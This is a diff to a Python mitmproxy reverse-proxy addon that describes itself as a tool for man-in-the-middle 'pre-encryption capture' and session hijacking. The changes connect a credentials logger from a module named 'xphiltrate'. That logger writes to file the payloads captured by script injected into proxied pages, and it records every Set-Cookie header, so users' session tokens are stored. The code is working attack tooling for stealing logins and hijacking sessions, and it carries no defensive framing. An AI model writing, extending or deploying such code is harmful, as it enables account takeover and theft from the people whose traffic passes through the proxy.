@@ -1,4 +1,5 @@
-#!/usr/bin/env python3
+# mim_proxy.py
+
 """
 MITM Reverse Proxy - Pre-Encryption Capture + Session Hijack
 """
@@ -12,6 +13,8 @@ from urllib.parse import urlparse
 from mitmproxy import http
 from mitmproxy.options import Options
 from mitmproxy.tools.dump import DumpMaster
+
+from xphiltrate.mitm_auth_logger import CredentialsLogger
 
 INJECTED_SCRIPT = """
 <script>
@@ -121,6 +124,8 @@ class ReverseProxyAddon:
         self.target_port   = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
         self.target_scheme = self.parsed.scheme
         self.target_origin = f"{self.parsed.scheme}://{self.parsed.netloc}"
+        # Logger integrated
+        self.logger = CredentialsLogger()
 
     def request(self, flow: http.HTTPFlow):
         # Intercept capture POSTs from injected JS
@@ -128,9 +133,11 @@ class ReverseProxyAddon:
             if flow.request.method == "POST":
                 try:
                     body = json.loads(flow.request.get_text())
-                    print_capture(
-                        body.get("type", "?"),
-                        body.get("url", "?"),
+                    # Log to file via Integrated Logger - 4/4
+                    self.logger.process_event(
+                        f"JS_CAPTURE_{body.get('type', 'UNK').upper()}",
+                        body.get("url", flow.request.pretty_url),
+                        "POST",
                         body.get("payload", {})
                     )
                 except Exception as e:
@@ -154,13 +161,14 @@ class ReverseProxyAddon:
         ct   = resp.headers.get("content-type", "")
 
         # ── Session cookie capture ──────────────────────────────
-        session_keywords = ("session", "token", "auth", "jwt", "sid", "sess")
-        all_cookies = resp.headers.get_all("set-cookie") if hasattr(resp.headers, "get_all") else [
-            v for k, v in resp.headers.items() if k.lower() == "set-cookie"
-        ]
-        matched = all_cookies
-        if matched:
-            print_session(flow.request.pretty_url, matched)
+        all_cookies = resp.headers.get_all("set-cookie")
+        if all_cookies:
+            self.logger.process_event(
+                event_type="SESSION_COOKIE",
+                request_url=flow.request.pretty_url,
+                request_method="SET-COOKIE",
+                request_payload={"set-cookie": all_cookies}
+            )
 
         # ── Login success hint ──────────────────────────────────
         if flow.request.method == "POST" and resp.status_code in (301, 302, 303, 307, 308):
